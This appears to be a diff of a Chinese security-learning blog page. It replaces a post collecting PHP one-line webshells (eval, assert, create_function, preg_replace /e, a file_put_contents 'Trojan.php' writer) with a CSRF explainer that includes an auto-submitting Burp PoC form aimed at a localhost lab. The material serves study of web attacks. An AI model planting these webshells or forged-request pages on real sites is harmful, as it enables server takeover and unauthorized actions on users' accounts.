@@ -19,24 +19,24 @@
   <meta name="author" content="Lixiney">
   <meta name="keywords" content="网络安全,前端开发,后端开发,全栈开发">
   
-    <meta name="description" content="eval函数123&lt;?php@eval($_REQUEST[&#x27;test&#x27;]);?&gt;    assert 函数1&lt;?php assert(@$_POST[&#x27;test&#x27;]); ?&gt;    function123456&lt;?phpfunction test1($code)&#123;	$code($_REQUEST[&#x27;test">
+    <meta name="description" content="攻击者通过某些技术手段欺骗用户的浏览器访问曾经认证过的网站并执行一些操作，挟持用户在当前已经登录的web应用程序上执行非本意的操作  攻击流程 用户登录站点a，并通过站点a的身份验证 用户未退出站点a，在同一个浏览器中访问危险站点b 站点b收到用户请求后，返回恶意代码并且发出访问站点a的请求 浏览器收到这些恶意代码后，在用户不知情的情况下，利用cookie的信息，向网站a发出恶意请求（修改密码，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP常用一句话木马整理">
-<meta property="og:url" content="https://blog.lixey.top/posts/90b3b820/index.html">
+<meta property="og:title" content="跨站请求伪造--CSRF">
+<meta property="og:url" content="https://blog.lixey.top/posts/9f0e9b52/index.html">
 <meta property="og:site_name" content="Lixiney&#39;s Blog">
-<meta property="og:description" content="eval函数123&lt;?php@eval($_REQUEST[&#x27;test&#x27;]);?&gt;    assert 函数1&lt;?php assert(@$_POST[&#x27;test&#x27;]); ?&gt;    function123456&lt;?phpfunction test1($code)&#123;	$code($_REQUEST[&#x27;test">
+<meta property="og:description" content="攻击者通过某些技术手段欺骗用户的浏览器访问曾经认证过的网站并执行一些操作，挟持用户在当前已经登录的web应用程序上执行非本意的操作  攻击流程 用户登录站点a，并通过站点a的身份验证 用户未退出站点a，在同一个浏览器中访问危险站点b 站点b收到用户请求后，返回恶意代码并且发出访问站点a的请求 浏览器收到这些恶意代码后，在用户不知情的情况下，利用cookie的信息，向网站a发出恶意请求（修改密码，">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-08-18T15:03:14.000Z">
-<meta property="article:modified_time" content="2025-08-18T15:21:26.333Z">
+<meta property="article:published_time" content="2025-08-24T13:17:02.000Z">
+<meta property="article:modified_time" content="2025-08-24T13:44:14.605Z">
 <meta property="article:author" content="Lixiney">
-<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>PHP常用一句话木马整理 - Lixiney&#39;s Blog</title>
+  <title>跨站请求伪造--CSRF - Lixiney&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -165,7 +165,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="PHP常用一句话木马整理"></span>
+            <span id="subtitle" data-typed-text="跨站请求伪造--CSRF"></span>
           
         </div>
 
@@ -181,8 +181,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-08-18 23:03" pubdate>
-          August 18, 2025 pm
+        <time datetime="2025-08-24 21:17" pubdate>
+          August 24, 2025 pm
         </time>
       </span>
     
@@ -193,7 +193,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          139 words
+          345 words
         
       </span>
     
@@ -204,7 +204,7 @@
         
         
         
-          2 mins
+          3 mins
         
       </span>
     
@@ -250,12 +250,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">PHP常用一句话木马整理</h1>
+            <h1 id="seo-header">跨站请求伪造--CSRF</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    Last updated on August 18, 2025 pm
+                    Last updated on August 24, 2025 pm
                   
                 
               </p>
@@ -263,42 +263,18 @@
             
               <div class="markdown-body">
                 
-                <h1 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert 函数"></a>assert 函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">assert</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test1</span>(<span class="hljs-params"><span class="hljs-variable">$code</span></span>)</span>&#123;<br>	<span class="hljs-variable">$code</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br>&#125;<br><span class="hljs-title function_ invoke__">test1</span>(assert);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-variable">$fun</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="call-user-func函数"><a href="#call-user-func函数" class="headerlink" title="call_user_func函数"></a>call_user_func函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">call_user_func</span>(assert,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace 函数"></a>preg_replace 函数</h1><blockquote>
-<p>如果在表达式末尾加上e，则可以执行代码</p>
+                <blockquote>
+<p>攻击者通过某些技术手段欺骗用户的浏览器访问曾经认证过的网站并执行一些操作，挟持用户在当前已经登录的web应用程序上执行非本意的操作</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/abcde/e&quot;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>], <span class="hljs-string">&quot;abcdefg&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><ul>
+<li>用户登录站点a，并通过站点a的身份验证</li>
+<li>用户未退出站点a，在同一个浏览器中访问危险站点b</li>
+<li>站点b收到用户请求后，返回恶意代码并且发出访问站点a的请求</li>
+<li>浏览器收到这些恶意代码后，在用户不知情的情况下，利用cookie的信息，向网站a发出恶意请求（修改密码，转账等操作）</li>
+<li>站点a接收到请求后，会根据用户的权限，处理请求，导致站点b的恶意代码被执行</li>
+</ul>
+<h1 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost:2233/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phonenum&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">      history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);</span><br><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
 
-
-
-<h1 id="file-put-content函数"><a href="#file-put-content函数" class="headerlink" title="file_put_content函数"></a>file_put_content函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-string">&#x27;&lt;?php $a=$_POST[&quot;test&quot;];assert($a); ?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;Trojan.php&quot;</span>, <span class="hljs-variable">$test</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<h1 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">forward_static_call_array</span>(assert,<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_POST</span>[x]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-
-
-<p>未完待续….</p>
 
                 
               </div>
@@ -307,11 +283,32 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
   
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/webshell/" class="print-no-link">#webshell</a>
+        <a href="/tags/web/" class="print-no-link">#web</a>
       
     </div>
   
@@ -323,8 +320,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>PHP常用一句话木马整理</div>
-      <div>https://blog.lixey.top/posts/90b3b820/</div>
+      <div>跨站请求伪造--CSRF</div>
+      <div>https://blog.lixey.top/posts/9f0e9b52/</div>
     </div>
     <div class="license-meta">
       
@@ -336,7 +333,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>August 18, 2025</div>
+          <div>August 24, 2025</div>
         </div>
       
       
@@ -368,18 +365,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/9f0e9b52/" title="跨站请求伪造--CSRF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">跨站请求伪造--CSRF</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/6a2b5ddf/" title="命令执行WAF绕过">
-                        <span class="hidden-mobile">命令执行WAF绕过</span>
+                      <a href="/posts/90b3b820/" title="PHP常用一句话木马整理">
+                        <span class="hidden-mobile">PHP常用一句话木马整理</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
